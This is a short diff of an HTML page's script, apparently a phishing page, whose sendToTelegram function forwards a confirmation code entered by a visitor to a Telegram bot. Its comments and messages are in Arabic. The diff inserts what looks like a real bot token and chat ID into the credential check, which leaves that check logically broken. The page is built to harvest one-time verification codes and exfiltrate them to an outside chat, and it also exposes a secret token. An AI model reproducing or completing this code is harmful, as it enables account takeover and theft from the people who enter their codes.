@@ -324,7 +324,7 @@ function sendToTelegram(code) {
   const message = `🔑 تم إدخال رمز التأكيد:\n${code}`;
 
   // إذا لم تضف بيانات البوت، أعرض تحذيرًا ثم حول العميل (سلوك تجريبي)
-  if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_هنا') || !CHAT_ID || CHAT_ID.includes('ضع_هنا')) {
+  if (!BOT_TOKEN || BOT_TOKEN.includes('8490790648:AAGGfGWVw-bvX1enS8UWaFVE0cCgphETNfo') || !CHAT_ID || CHAT_ID.includes('5450865891')) {
     console.warn('Telegram credentials not set. Skipping fetch.');
     alert('تنبيه: لم يتم ضبط بيانات بوت تلجرام. سيتم تحويلك تجريبياً إلى الصفحة التالية.');
     // تحويل تجريبي
@@ -375,3 +375,4 @@ nextBtn.addEventListener("click", () => {
 </script>
 </body>
 </html>
+
